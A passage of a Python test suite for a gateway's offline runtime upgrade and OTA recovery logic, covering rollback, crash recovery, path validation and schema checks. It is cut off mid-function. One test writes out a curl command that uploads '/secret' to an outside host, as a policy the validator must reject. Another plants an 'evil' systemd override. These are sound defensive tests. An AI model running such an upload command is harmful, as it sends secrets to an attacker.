"""Production file lifecycle in private Linux directories; no real service/SHM."""
import copy
import importlib.util
import json
import hashlib
import os
import shutil
import struct
import subprocess
import time
import types
import tarfile
import io
from pathlib import Path
import tempfile
import unittest
from unittest import mock

REPO = Path(__file__).resolve().parents[1]


def load():
    spec = importlib.util.spec_from_file_location('production_offline_test', REPO / 'deploy/offline-runtime-upgrade.py')
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@unittest.skipUnless(os.geteuid() == 0, 'root-owned private lifecycle fixture required')
class ProductionRuntimeTest(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix='production-runtime-')
        self.addCleanup(self.temp.cleanup)
        self.root = Path(self.temp.name)
        self.m = load()
        self.g = self.m.guard
        def mapped(*parts):
            path = Path(*parts)
            if path.is_absolute() and path.parts[1] in ('opt', 'etc', 'proc', 'dev', 'run'):
                return self.root / 'system' / str(path).lstrip('/')
            return path
        self.path = mapped
        self.patch(self.m, 'Path', mapped)
        self.patch(self.g, 'Path', mapped)
        self.g.SYSTEMD_ROOTS = ('/etc/systemd/system',)
        self.patch(self.m.os, 'uname', lambda: types.SimpleNamespace(machine='aarch64'))
        self.patch(self.m.time, 'sleep', lambda seconds: None)
        self.home = mapped('/opt/modbus-gateway')
        self.payload = self.root / 'payload'
        stage = self.root / 'staged-entry'
        for name in self.g.PRODUCTION_HELPERS | {'gateway-ota-recover.service'}:
            self.write(stage / name, (REPO / 'deploy' / name).read_bytes(),
                       0o644 if name.endswith('.service') else 0o755)
        self.m.__file__ = str(stage / 'offline-runtime-upgrade.py')
        self.units = ['gateway-services.service', self.g.MONITOR_UNIT,
                      'system-monitor@.service', 'can-driver@.service', 'ky-ems.service']
        self.allowed = ['gateway-services.service', self.g.MONITOR_UNIT]
        self.calls = []
        self.pid = '98765'
        self.live = set(self.allowed)
        self.fail_start = False
        self.fail_health = False
        self.write(mapped('/proc/sys/kernel/random/boot_id'), 'LOCAL_BOOT\n')
        self.write(mapped('/proc/meminfo'), 'MemAvailable: 2097152 kB\n')
        self.write(mapped('/proc') / str(os.getpid()) / 'stat', Path('/proc') .joinpath(str(os.getpid()), 'stat').read_bytes())
        self.write(mapped('/proc') / str(os.getpid()) / 'maps', b'')
        (mapped('/proc') / str(os.getpid()) / 'fd').mkdir(mode=0o700)
        self.write(mapped('/run/gateway-offline-runtime.lock'), b'', 0o600)
        self.write(mapped('/etc/modbus-gateway/ota.pub'), 'PRIVATE FIXTURE PUBLIC KEY PLACEHOLDER\n')
        self.write(self.home / 'config/runtime/device_identity.json', '{"machineCode":"FLEET_NODE_NOT_CORE"}\n')
        self.write(self.home / 'config/runtime/apps/monitor-service.json', '{"sharedMemoryName":"live_v11"}\n')
        self.write(self.home / 'data/runtime-upgrade-stop', 'HISTORICAL_R2\n', 0o600)
        self.write(mapped('/dev/shm/live_v11'), struct.pack('<II', 0x4d505354, 11))
        with mapped('/dev/shm/live_v11').open('r+b') as stream:
            stream.truncate(self.g.POINT_STORE_SIZES[11])
        self.write(mapped('/dev/shm/retired_v10'), struct.pack('<II', 0x4d505354, 10))
        for name in self.g.PRODUCTION_HELPERS:
            source = REPO / 'deploy' / name
            self.write(self.payload / 'bin' / name, source.read_bytes(), 0o755)
            self.write(self.home / 'bin' / name, b'old paired ' + name.encode(), 0o755)
        self.write(self.home / 'bin/SystemMonitor', self.elf(b'old-monitor'), 0o755)
        self.write(self.payload / 'bin/SystemMonitor', self.elf(b'new-monitor'), 0o755)
        self.write(self.home / 'ky-ems/plugins/platforms/libqeglfs.so', self.elf(b'preserved-qt'), 0o644)
        self.write(self.payload / 'ky-ems/plugins/platforms/libqeglfs.so', self.elf(b'preserved-qt'), 0o644)
        gates = {}
        for unit in self.units:
            name = unit.split('@')[0] + '@.service' if '@' in unit else unit
            self.write(mapped('/etc/systemd/system') / name, '[Service]\nExecStart=/fixture/never-executed\n', 0o644)
            path = mapped('/etc/systemd/system') / (unit + '.d/90-offline-HISTORICAL_R2.conf')
            self.write(path, 'historical pinned gate ' + unit, 0o644)
            gates[unit] = str(path)
        self.write(mapped('/etc/systemd/system/gateway-ota-recover.service'), '[Service]\nType=oneshot\n', 0o644)
        historical = self.root / 'historical'
        for name in ('state.json', 'approval.json', 'activation-ready.json'):
            self.write(historical / name, '{}\n', 0o600)
        self.write(historical / 'state.json', json.dumps({'segments': [{'source': 'retired_v10', 'target': 'live_v11'}]}) + '\n', 0o600)
        self.write(historical / 'approval.json', json.dumps({'units': self.units}) + '\n', 0o600)
        self.write(historical / 'verifier.py', '# private legacy verifier substitute\n', 0o600)
        active = {'stateDir': str(historical), 'stateSha256': self.m.digest(historical / 'state.json'),
                  'approvalSha256': self.m.digest(historical / 'approval.json'),
                  'readySha256': self.m.digest(historical / 'activation-ready.json'), 'allowedUnits': self.allowed}
        self.write(self.home / 'data' / self.g.ACTIVATION_FILE, json.dumps(active), 0o600)
        retired = mapped('/dev/shm/retired_v10').stat()
        segment = mapped('/dev/shm/live_v11').stat()
        self.previous = dict(format='runtime-baseline-v1', baselineId='LEGACY_SNAPSHOT', generation=1,
            parentSha256=None, gatewayHome=str(self.home), machineCode='FLEET_NODE_NOT_CORE', architecture='aarch64',
            pointStoreAbi=11, pointStoreSize=self.g.POINT_STORE_SIZES[11], clusterProtocol=2, controlEnabled=False,
            files=self.g.production_files(self.home), configSha256=self.m.tree_hashes(self.home / 'config/runtime'),
            units=self.units, allowedUnits=self.allowed, unitFiles=self.g.production_unit_files(self.units), gates=gates,
            segments=[dict(name='live_v11', dev=segment.st_dev, ino=segment.st_ino)],
            retiredSources={'retired_v10': dict(dev=retired.st_dev, ino=retired.st_ino)},
            historical={str(p): self.g.production_pin(p) for p in historical.iterdir()}, bootId='LOCAL_BOOT',
            release='old', trust=dict(requireSignature=True, checksumRequired=True, allowInsecureHttp=False,
                publicKeySha256=self.m.digest(mapped('/etc/modbus-gateway/ota.pub')), httpsOrigins=['https://fixture.invalid']),
            healthPolicy=dict(stableSeconds=2, url='http://127.0.0.1:8080/health', timeoutSeconds=3))
        for p in (self.home / 'data/runtime-upgrade-stop', self.home / 'data' / self.g.ACTIVATION_FILE):
            self.previous['historical'][str(p)] = self.g.production_pin(p)
        self.candidate = copy.deepcopy(self.previous)
        self.candidate.update(baselineId='B0', release='bootstrap', files=self.g.production_files(self.payload))
        self.candidate['unitFiles'][str(mapped('/etc/systemd/system/gateway-ota-recover.service'))] = self.g.production_pin(stage / 'gateway-ota-recover.service')
        for unit, path in gates.items():
            body = self.m.production_gate(self.home, unit)
            self.candidate['unitFiles'][path] = dict(sha256=hashlib.sha256(body).hexdigest(), mode=0o644, bytes=len(body))
        self.approval = dict(format='runtime-provisioning-v1', transaction='ADOPT_01', operation='adopt',
            expiresAtUnix=int(time.time()) + 600, gatewayHome=str(self.home), machineCode='FLEET_NODE_NOT_CORE',
            parentSha256=None, previous=self.previous, candidate=self.candidate,
            legacy=dict(verifierPath=str(historical / 'verifier.py'), verifierSha256=self.m.digest(historical / 'verifier.py'),
                activeSha256=self.m.digest(self.home / 'data' / self.g.ACTIVATION_FILE),
                stateSha256=active['stateSha256'], approvalSha256=active['approvalSha256'], readySha256=active['readySha256']))
        self.runtime = self.m.ProductionRuntime(self.home)
        self.patch(self.m, 'systemctl', self.systemctl)
        self.patch(self.g, 'systemctl_value', self.property)
        self.patch(self.m.subprocess, 'run', self.external)
        self.make_process()
        self.original_inode = segment.st_ino

    def patch(self, *args, **kwargs):
        patcher = mock.patch.object(*args, **kwargs)
        result = patcher.start()
        self.addCleanup(patcher.stop)
        return result

    def write(self, path, content, mode=0o644):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(content.encode() if isinstance(content, str) else content)
        path.chmod(mode)

    def elf(self, payload):
        header = bytearray(64)
        header[:6] = b'\x7fELF\x02\x01'
        struct.pack_into('<HH', header, 16, 2, 183)
        return bytes(header) + payload

    def make_process(self):
        proc = self.path('/proc') / self.pid
        proc.mkdir(parents=True, exist_ok=True)
        if (proc / 'exe').is_symlink():
            (proc / 'exe').unlink()
        (proc / 'exe').symlink_to(self.home / 'bin/SystemMonitor')
        s = self.path('/dev/shm/live_v11').stat()
        self.write(proc / 'maps', '1000-2000 rw-s 00000000 %02x:%02x %d /dev/shm/live_v11\n' %
                   (os.major(s.st_dev), os.minor(s.st_dev), s.st_ino))
        self.write(proc / 'stat', self.pid + ' (private-fixture) ' + ' '.join(['0'] * 19 + ['12345']))
        (proc / 'fd').mkdir(mode=0o700, exist_ok=True)

    def property(self, unit, prop):
        if prop == 'ActiveState': return 'active' if unit in self.live else 'inactive'
        if prop == 'SubState': return 'running' if unit in self.live else 'dead'
        if prop == 'MainPID': return self.pid if unit == self.g.MONITOR_UNIT and unit in self.live else '0'
        if prop == 'NRestarts': return '0'
        if prop == 'LoadState': return 'loaded'
        if prop == 'NeedDaemonReload': return 'no'
        if prop == 'FragmentPath':
            fragment = unit.split('@')[0] + '@.service' if '@' in unit else unit
            return str(self.path('/etc/systemd/system') / fragment)
        if prop == 'DropInPaths':
            names = {unit + '.d'}
            if '@' in unit: names.add(unit.split('@')[0] + '@.service.d')
            return ' '.join(str(p) for p in self.path('/etc/systemd/system').rglob('*.conf') if p.parent.name in names)
        raise AssertionError('unexpected systemd property: ' + prop)

    def systemctl(self, *args):
        self.calls.append(args)
        if args[0] == 'stop':
            self.live.difference_update(args[1:])
            proc = self.path('/proc') / self.pid
            if proc.exists(): shutil.rmtree(proc)
            return ''
        if args[0] == 'show':
            if len(args) == 4 and args[1:3] == ('--property=ActiveState', '--value') and args[3] in self.units:
                return self.property(args[3], 'ActiveState')
            if len(args) >= 3 and args[1] == '--property=Id,ActiveState,MainPID' and all(u in self.units for u in args[2:]):
                return '\n\n'.join('Id=%s\nActiveState=%s\nMainPID=%s' %
                        (u, self.property(u, 'ActiveState'), self.property(u, 'MainPID')) for u in args[2:])
            raise AssertionError('unexpected fixture show grammar: ' + str(args))
        if args[0] == 'start':
            if self.fail_start: raise ValueError('injected start failure')
            self.live.add(args[1])
            if args[1] == self.g.MONITOR_UNIT: self.make_process()
            return ''
        if args[0] in ('daemon-reload', 'is-active'): return ''
        raise AssertionError('unexpected service action: ' + str(args))

    def external(self, command, **kwargs):
        self.calls.append(tuple(command))
        if command[0] == '/usr/bin/systemd-run':
            self.assertIn('--no-block', command)
            self.assertIn('--property=After=gateway-ota-recover.service', command)
            self.assertEqual(command[-2:], ['production-boot-finish', str(self.home)])
            return subprocess.CompletedProcess(command, 0, b'', b'')
        if command[:2] == ['systemctl', 'list-units'] or command[:2] == ['systemctl', 'list-unit-files']:
            return subprocess.CompletedProcess(command, 0, '\n'.join(u + ' loaded' for u in self.units), '')
        if command[0] == '/usr/bin/python3' and 'activated-unit' in command:
            return subprocess.CompletedProcess(command, 0, b'private legacy proof substitute', b'')
        if command[0] == '/usr/bin/curl':
            self.assertEqual(command[:2], ['/usr/bin/curl', '--disable'])
            self.assertEqual(command[-2:], ['--', 'http://127.0.0.1:8080/health'])
            self.assertEqual(kwargs['env'], {'PATH': '/usr/bin:/bin', 'LC_ALL': 'C'})
            return subprocess.CompletedProcess(command, 1 if self.fail_health else 0, b'', b'')
        raise AssertionError('unexpected external command: ' + str(command))

    def args(self):
        approval = self.root / (self.approval['transaction'] + '.json')
        self.write(approval, json.dumps(self.approval) + '\n', 0o600)
        return types.SimpleNamespace(approval=approval, approval_sha256=self.m.digest(approval), payload=self.payload)

    def adopt(self):
        args = self.args()
        with self.m.production_lock():
            tx = self.m.production_adopt(args)
        return tx, args

    def next_release(self):
        previous = self.g.production_context(self.home)
        pointer = self.g.production_json(self.runtime.root / 'current.json')
        self.write(self.payload / 'bin/SystemMonitor', self.elf(b'really-different-release'), 0o755)
        candidate = copy.deepcopy(previous)
        candidate.update(baselineId='B1', generation=2, parentSha256=pointer['sha256'], release='1.1',
                         files=self.g.production_files(self.payload))
        self.approval.update(transaction='INSTALL_02', operation='install', previous=previous,
                             candidate=candidate, parentSha256=pointer['sha256'], legacy=None)
        return self.args()
    def test_production_entry_exists_without_changing_legacy_actions(self):
        module = load()
        self.assertTrue(callable(getattr(module, 'production_adopt', None)),
                        'formal production adoption is missing')
        self.assertTrue(callable(getattr(module, 'production_install', None)))
        self.assertTrue(callable(getattr(module, 'production_recover', None)))
        for action in ('apply', 'recover', 'observe', 'activate'):
            self.assertTrue(callable(getattr(module, action)))

    def test_adopt_changed_same_abi_install_health_promotion(self):
        tx, _ = self.adopt()
        self.assertEqual(self.g.production_context(self.home)['baselineId'], 'B0')
        args = self.next_release()
        with self.m.production_lock(): self.m.production_install(args)
        self.assertEqual(self.g.production_context(self.home)['baselineId'], 'B1')
        self.assertFalse((self.runtime.root / 'pending.json').exists())
        self.assertEqual(self.path('/dev/shm/live_v11').stat().st_ino, self.original_inode)
        self.assertTrue((tx / 'health.json').exists())

    def test_failed_health_recovers_code_gates_pointer_not_mutable_data(self):
        self.adopt()
        old = (self.home / 'bin/SystemMonitor').read_bytes()
        args = self.next_release()
        self.fail_health = True
        with self.assertRaisesRegex(ValueError, 'endpoint health'):
            with self.m.production_lock(): self.m.production_install(args)
        with self.path('/dev/shm/live_v11').open('r+b') as f:
            f.seek(4096); f.write(b'NEW MUTABLE BUSINESS DATA')
        self.fail_health = False
        tx = self.runtime.root / 'transactions/INSTALL_02'
        with self.m.production_lock(): result = self.runtime.recover(tx, args.approval_sha256)
        self.assertEqual(result, 'RECOVERED')
        self.assertEqual(self.g.production_context(self.home)['baselineId'], 'B0')
        self.assertEqual((self.home / 'bin/SystemMonitor').read_bytes(), old)
        with self.path('/dev/shm/live_v11').open('rb') as f:
            f.seek(4096); self.assertEqual(f.read(25), b'NEW MUTABLE BUSINESS DATA')
        self.assertEqual(self.path('/dev/shm/live_v11').stat().st_ino, self.original_inode)

    def test_invalid_parent_expiry_config_or_architecture_zero_mutation(self):
        for field, value in [('expiresAtUnix', 0), ('machineCode', 'FOREIGN')]:
            original = self.approval[field]
            self.approval[field] = value
            with self.assertRaises(ValueError): self.adopt()
            self.assertFalse(self.runtime.root.exists())
            self.assertFalse(any(c[0] in ('stop', 'start', 'daemon-reload') for c in self.calls))
            self.approval[field] = original

    def test_nested_qt_library_preserved_and_unsafe_paths_denied(self):
        self.g.production_schema(self.candidate, self.home)
        for path in ('ky-ems/../outside', '/bin/outside', 'ky-ems/plugins/./x', 'bin//x'):
            bad = copy.deepcopy(self.candidate)
            bad['files'][path] = bad['files']['bin/SystemMonitor']
            with self.assertRaises(ValueError): self.g.production_schema(bad, self.home)

    def test_payload_wrong_elf_architecture_denies_before_any_intent(self):
        path = self.payload / 'bin/SystemMonitor'
        header = bytearray(path.read_bytes())
        struct.pack_into('<H', header, 18, 62)
        self.write(path, header, 0o755)
        self.candidate['files']['bin/SystemMonitor'] = self.g.production_pin(path)
        with self.assertRaisesRegex(ValueError, 'ELF architecture mismatch'):
            self.adopt()
        self.assertFalse(self.runtime.root.exists())
        self.assertFalse(any(c[0] in ('stop', 'start', 'daemon-reload') for c in self.calls))

    def test_boot_malformed_pending_ref_denies_before_recovery_or_mutation(self):
        self.adopt()
        pending = self.runtime.root / 'pending.json'
        for value in ([], {'transaction': '../outside', 'approvalSha256': '1' * 64},
                      {'transaction': 'ADOPT_01'}, {'transaction': 'ADOPT_01', 'approvalSha256': False},
                      {'transaction': 'ADOPT_01', 'approvalSha256': '1' * 64}):
            self.write(pending, json.dumps(value), 0o600)
            before = pending.read_bytes()
            self.calls.clear()
            with self.assertRaisesRegex(ValueError, 'production boot'):
                self.m.production_boot(types.SimpleNamespace(home=self.home))
            self.assertEqual(pending.read_bytes(), before)
            self.assertFalse(self.calls)

    def test_arbitrary_curl_argv_or_url_options_are_not_a_policy(self):
        for policy in ({'stableSeconds': 2, 'endpointArgv': ['/usr/bin/curl', '--upload-file', '/secret',
                        'https://outside.invalid/collect', '--fail', '--max-time', '3', 'http://127.0.0.1:8080/health']},
                       {'stableSeconds': 2, 'timeoutSeconds': 3, 'url': 'http://127.0.0.1:8080/a https://outside.invalid'},
                       {'stableSeconds': 2, 'timeoutSeconds': True, 'url': 'http://127.0.0.1:8080/health'}):
            bad = copy.deepcopy(self.candidate); bad['healthPolicy'] = policy
            with self.assertRaises(ValueError): self.g.production_schema(bad, self.home)

    def test_controller_start_rejected_and_inventory_kept(self):
        self.adopt()
        with self.assertRaisesRegex(ValueError, 'controller/unapproved'):
            self.g.production_unit(self.home, 'ky-ems.service')
        self.assertIn('ky-ems/plugins/platforms/libqeglfs.so', self.g.production_context(self.home)['files'])

    def test_historical_drift_and_unknown_unit_or_override_refuse_before_stop(self):
        self.write(self.root / 'historical/state.json', '{"drift":true}\n', 0o600)
        with self.assertRaises(ValueError): self.adopt()
        self.assertFalse(self.runtime.root.exists())
        self.write(self.root / 'historical/state.json', json.dumps({'segments': [{'source': 'retired_v10', 'target': 'live_v11'}]}) + '\n', 0o600)
        override = self.path('/etc/systemd/system/system-monitor@.service.d/evil.conf')
        self.write(override, '[Service]\nExecStart=/evil\n')
        with self.assertRaisesRegex(ValueError, 'unit/override drift'): self.adopt()
        self.assertFalse(self.runtime.root.exists())

    def test_symlink_payload_or_installed_file_rejects(self):
        p = self.payload / 'ky-ems/plugins/platforms/libqeglfs.so'
        p.unlink(); p.symlink_to(self.home / 'ky-ems/plugins/platforms/libqeglfs.so')
        with self.assertRaisesRegex(ValueError, 'symlink production payload'): self.adopt()
        self.assertFalse(self.runtime.root.exists())

    def test_terminal_write_failure_reconciles_promoted_not_rollback(self):
        original = self.runtime.state
        def fail_completed(tx, value):
            if value['phase'] == 'COMPLETED': raise OSError('injected final journal write')
            return original(tx, value)
        args = self.args()
        with mock.patch.object(self.m.ProductionRuntime, 'state', lambda owner, tx, value: fail_completed(tx, value)):
            with self.assertRaisesRegex(OSError, 'final journal'):
                with self.m.production_lock(): self.m.production_adopt(args)
        tx = self.runtime.root / 'transactions/ADOPT_01'
        installed = (self.home / 'bin/SystemMonitor').read_bytes()
        with self.m.production_lock(): self.assertEqual(self.runtime.recover(tx, args.approval_sha256), 'COMPLETED')
        self.assertEqual((self.home / 'bin/SystemMonitor').read_bytes(), installed)
        self.assertEqual(self.g.production_context(self.home)['baselineId'], 'B0')

    def test_duplicate_adoption_is_consumed(self):
        self.adopt()
        self.calls.clear()
        with self.assertRaisesRegex(ValueError, 'consumed'): self.adopt()
        self.assertFalse(any(c[0] in ('stop', 'start', 'daemon-reload') for c in self.calls))

    def test_malformed_pointer_and_pending_ref_deny_before_path_join(self):
        self.adopt()
        pointer = self.runtime.root / 'current.json'
        original = pointer.read_bytes()
        for field, value in [('transaction', '../../outside'), ('transaction', []), ('sha256', 7), ('baselineId', None)]:
            data = json.loads(original); data[field] = value
            self.write(pointer, json.dumps(data), 0o600)
            with self.assertRaises(ValueError): self.g.production_context(self.home)
        self.write(pointer, original, 0o600)
        for data in ({'transaction': '../outside', 'approvalSha256': '1' * 64}, [],
                     {'transaction': 'T', 'approvalSha256': False}, {'transaction': 'T'}):
            self.write(self.runtime.root / 'pending.json', json.dumps(data), 0o600)
            with self.assertRaises(ValueError): self.g.production_unit(self.home, self.g.MONITOR_UNIT)

    def test_schema_field_types_and_duplicate_json_deny(self):
        for key, value in [('units', {}), ('files', []), ('segments', None), ('healthPolicy', []), ('historical', None)]:
            bad = copy.deepcopy(self.candidate); bad[key] = value
            with self.assertRaises(ValueError): self.g.production_schema(bad, self.home)
        path = self.root / 'duplicate.json'
        self.write(path, '{"transaction":"A","transaction":"B"}', 0o600)
        with self.assertRaisesRegex(ValueError, 'duplicate'): self.g.production_json(path)

    def test_new_boot_or_replaced_v11_refuses_before_mutation(self):
        self.write(self.path('/proc/sys/kernel/random/boot_id'), 'NEW_BOOT\n')
        with self.assertRaisesRegex(ValueError, 'retired source recreated'): self.adopt()
        self.assertFalse(self.runtime.root.exists())

    def test_pretty_approval_survives_failed_install_and_real_recovery(self):
        path = self.root / 'pretty-approval.json'
        raw = (json.dumps(self.approval, indent=4) + '\n').encode()
        self.write(path, raw, 0o600)
        args = types.SimpleNamespace(approval=path, approval_sha256=self.m.digest(path), payload=self.payload)
        self.fail_start = True
        with self.assertRaisesRegex(ValueError, 'start failure'):
            with self.m.production_lock(): self.m.production_adopt(args)
        tx = self.runtime.root / 'transactions/ADOPT_01'
        self.assertEqual((tx / 'approval.json').read_bytes(), raw)
        self.fail_start = False
        with self.m.production_lock(): self.assertEqual(self.runtime.recover(tx, args.approval_sha256), 'RECOVERED')
        self.assertEqual((self.home / 'bin/SystemMonitor').read_bytes(), self.elf(b'old-monitor'))
        self.assertFalse((self.runtime.root / 'current.json').exists())

    def test_partial_copy_fsync_and_rename_interruptions_are_owned_and_archived(self):
        for event in ('copy-fsync', 'copy-rename'):
            with self.subTest(event=event):
                # Separate transaction/namespace for each attempt, not a replay.
                self.approval['transaction'] = 'ADOPT_' + event.replace('-', '_')
                args = self.args()
                original_fsync, original_replace = self.m.os.fsync, self.m.os.replace
                fired = []
                def fail_sync(fd):
                    name = os.readlink('/proc/self/fd/' + str(fd))
                    if event == 'copy-fsync' and '.SystemMonitor.production-' in name and not fired:
                        fired.append(name); raise OSError('injected copy fsync crash')
                    return original_fsync(fd)
                def fail_replace(source, target):
                    if event == 'copy-rename' and '.SystemMonitor.production-' in str(source) and not fired:
                        fired.append(str(source)); raise OSError('injected copy rename crash')
                    return original_replace(source, target)
                with mock.patch.object(self.m.os, 'fsync', fail_sync), mock.patch.object(self.m.os, 'replace', fail_replace):
                    with self.assertRaisesRegex(OSError, 'copy .* crash'):
                        with self.m.production_lock(): self.m.production_adopt(args)
                tx = self.runtime.root / 'transactions' / self.approval['transaction']
                self.assertEqual(len(fired), 1)
                self.assertTrue(Path(fired[0]).exists())
                with self.m.production_lock(): self.runtime.recover(tx, args.approval_sha256)
                self.assertFalse(Path(fired[0]).exists())
                self.assertEqual(len(list((tx / 'interrupted-copies').iterdir())), 1)
                self.assertEqual((self.home / 'bin/SystemMonitor').read_bytes(), self.elf(b'old-monitor'))

    def test_unowned_hidden_file_is_not_silently_ignored_or_removed(self):
        self.fail_start = True
        args = self.args()
        with self.assertRaises(ValueError):
            with self.m.production_lock(): self.m.production_adopt(args)
        foreign = self.home / 'bin/.unknown.production-OTHER-install'
        self.write(foreign, b'unknown owner', 0o600)
        tx = self.runtime.root / 'transactions/ADOPT_01'
        with self.assertRaisesRegex(ValueError, 'unowned production runtime'):
            with self.m.production_lock(): self.runtime.recover(tx, args.approval_sha256)
        self.assertEqual(foreign.read_bytes(), b'unknown owner')
        self.assertFalse(self.live)

    def test_process_death_mid_copy_is_recovered_without_ignoring_inventory(self):
        args = self.args()
        pid = os.fork()
        if pid == 0:
            self.write(self.path('/proc') / str(os.getpid()) / 'stat',
                       Path('/proc').joinpath(str(os.getpid()), 'stat').read_bytes())
            original = self.m.os.fsync
            def die(fd):
                if '.SystemMonitor.production-ADOPT_01-install' in os.readlink('/proc/self/fd/' + str(fd)):
                    os._exit(73)
                return original(fd)
            self.m.os.fsync = die
            with self.m.production_lock(): self.m.production_adopt(args)
            os._exit(74)
        _, status = os.waitpid(pid, 0)
        self.assertTrue(os.WIFEXITED(status))
        self.assertEqual(os.WEXITSTATUS(status), 73)
        tx = self.runtime.root / 'transactions/ADOPT_01'
        self.assertEqual(self.g.production_json(tx / 'state.json')['phase'], 'INSTALLING')
        self.assertTrue(self.runtime.copy_name(tx, 'bin/SystemMonitor', 'install').exists())
        with self.m.production_lock(): self.runtime.recover(tx, args.approval_sha256)
        self.assertEqual(len(list((tx / 'interrupted-copies').iterdir())), 1)
        self.assertEqual(self.g.production_files(self.home), self.previous['files'])

    def test_partial_gate_conversion_recovers_exact_old_bodies(self):
        original = self.m.replace
        fired = []
        def fail_gate(path, data, mode=0o600):
            if b' production-unit ' in data and not fired:
                fired.append(path); raise OSError('injected gate conversion crash')
            return original(path, data, mode)
        args = self.args()
        with mock.patch.object(self.m, 'replace', fail_gate):
            with self.assertRaisesRegex(OSError, 'gate conversion'):
                with self.m.production_lock(): self.m.production_adopt(args)
        tx = self.runtime.root / 'transactions/ADOPT_01'
        with self.m.production_lock(): self.runtime.recover(tx, args.approval_sha256)
        self.assertEqual(self.g.production_unit_files(self.units), self.previous['unitFiles'])

    def test_resource_drift_before_start_leaves_fenced_recoverable(self):
        original = self.runtime.convert_gates
        def drift(owner, tx, baseline):
            original(tx, baseline)
            self.write(self.path('/proc/meminfo'), 'MemAvailable: 1 kB\n')
        args = self.args()
        with mock.patch.object(self.m.ProductionRuntime, 'convert_gates', drift):
            with self.assertRaisesRegex(ValueError, 'insufficient MemAvailable'):
                with self.m.production_lock(): self.m.production_adopt(args)
        self.assertFalse(any(c[0] == 'start' for c in self.calls))
        with self.assertRaises(ValueError): self.g.production_unit(self.home, self.g.MONITOR_UNIT)
        self.write(self.path('/proc/meminfo'), 'MemAvailable: 2097152 kB\n')
        with self.m.production_lock(): self.runtime.recover(self.runtime.root / 'transactions/ADOPT_01', args.approval_sha256)

    def test_offline_lock_conflict_refuses_before_approval_or_gate_writes(self):
        import fcntl
        fd = os.open(str(self.path('/run/gateway-offline-runtime.lock')), os.O_RDWR)
        try:
            fcntl.flock(fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
            with self.assertRaises(BlockingIOError):
                with self.m.production_lock(): self.m.production_adopt(self.args())
        finally:
            os.close(fd)
        self.assertFalse(self.runtime.root.exists())

    def test_boot_precedes_launcher_and_never_recreates_retired_or_v11_files(self):
        self.adopt()
        source = self.path('/dev/shm/retired_v10')
        source.unlink()
        self.path('/dev/shm/live_v11').unlink()
        self.write(self.path('/proc/sys/kernel/random/boot_id'), 'NEXT_BOOT\n')
        with self.assertRaises(ValueError):
            self.m.production_boot(types.SimpleNamespace(home=self.home))
        with self.assertRaises(ValueError): self.g.production_unit(self.home, 'gateway-services.service')
        self.assertFalse(source.exists())
        self.assertFalse(self.path('/dev/shm/live_v11').exists())

    def owner_fixture(self):
        self.adopt()
        self.home.joinpath('ota/staging').mkdir(parents=True)
        artifact = self.root / 'release.tar.gz'
        pointer = self.g.production_json(self.runtime.root / 'current.json')
        self.write(self.payload / 'bin/SystemMonitor', self.elf(b'OTA changed runtime'), 0o755)
        manifest = dict(format='runtime-release-v1', version='1.1', packageType='full', fromAbi=11, toAbi=11,
                        clusterProtocol=2, architecture='aarch64', parents=[pointer['sha256']],
                        expiresAtUnix=int(time.time()) + 600, files=self.g.production_files(self.payload))
        with tarfile.open(artifact, 'w:gz') as archive:
            raw = json.dumps(manifest).encode()
            info = tarfile.TarInfo('runtime-manifest.json'); info.size = len(raw)
            archive.addfile(info, io.BytesIO(raw))
            for relative in manifest['files']:
                archive.add(self.payload / relative, arcname=relative, recursive=False)
        spec = importlib.util.spec_from_file_location('durable_production_health_test', REPO / 'deploy/ota-health-result.py')
        helper = importlib.util.module_from_spec(spec); spec.loader.exec_module(helper)
        owner = helper.RuntimeHandoff(self.home / 'ota/staging', 'POST_SIGNATURE_LOCAL', '12345678-1234-4234-8234-123456789abc')
        lease_path = owner.root / ('ota_job_' + owner.job + '.lock')
        self.write(lease_path, b'', 0o600)
        lease = lease_path.stat()
        intent = dict(format='ota-job-v1', lifecycle='systemd-handoff-v1', jobId=owner.job, token=owner.token,
                      machineCode='FLEET_NODE_NOT_CORE', version='1.1', artifactPath=str(artifact), previousVersion='bootstrap',
                      artifactSize=str(artifact.stat().st_size), artifactSha256=self.m.digest(artifact),
                      leaseDev=str(lease.st_dev), leaseInode=str(lease.st_ino))
        self.write(owner.intent_path, json.dumps(intent) + '\n', 0o600)
        self.write(owner.root / 'ota_active_job.txt', 'jobId=' + owner.job + '\ntoken=' + owner.token + '\n', 0o600)
        stage = owner.root / ('runtime-entry-' + owner.job)
        pins = {}
        for name in ('offline-runtime-upgrade.py', 'runtime-upgrade-guard.py', 'ota-health-result.py'):
            self.write(stage / name, (REPO / 'deploy' / name).read_bytes(), 0o400)
            pins[name] = self.m.digest(stage / name)
        record = dict(format='ota-handoff-v1', phase='OWNER_OWNED', runtimeMayChange=False, jobId=owner.job,
                      token=owner.token, unit=owner.unit, version='1.1', bootId=owner.boot(), entry=str(stage), pins=pins,
                      intentSha256=self.m.digest(owner.intent_path), leaseIdentity=dict(dev=lease.st_dev, inode=lease.st_ino))
        owner.save(record)
        self.patch(owner, 'verify_owner', lambda *a, **k: dict(ActiveState='inactive', MainPID='0', Job=''))
        self.patch(owner, 'no_unit_tasks', lambda *a: None)
        # Only the namespace/systemd boundary is substituted; durable journals,
        # leases, parser, pinned-input checks and official resume run as written.
        self.patch(owner, 'production_entry', lambda r: self.m)
        return owner

    def test_post_signature_owner_installs_changed_runtime_and_emits_durable_bound_health(self):
        owner = self.owner_fixture()
        with owner.lease(): self.m.production_ota_owner(owner, owner.read())
        record = owner.read()
        self.assertEqual(record['phase'], 'OWNER_FINISHED')
        self.assertTrue(record['runtimeMayChange'])
        self.assertEqual(self.g.production_context(self.home)['release'], '1.1')
        health = self.g.production_json(owner.root / ('health_' + owner.job + '.txt'))
        self.assertEqual((health['status'], health['rollback']), ('healthy', 'none'))
        self.assertEqual(record['completionProof']['healthRecord'], (owner.root / ('health_' + owner.job + '.txt')).read_text())

    def test_original_job_official_recovery_after_promotion_health_version_or_final_crash(self):
        for event in ('before-health', 'current-version', 'applied-version', 'owner-final'):
            with self.subTest(event=event):
                child = ProductionRuntimeTest('test_production_entry_exists_without_changing_legacy_actions')
                child.setUp()
                try:
                    owner = child.owner_fixture()
                    original_record, original_replace, original_save = child.runtime.record, child.m.replace, owner.save
                    def fail_record(runtime, path, value):
                        if event == 'before-health' and path.name == 'health_' + owner.job + '.txt':
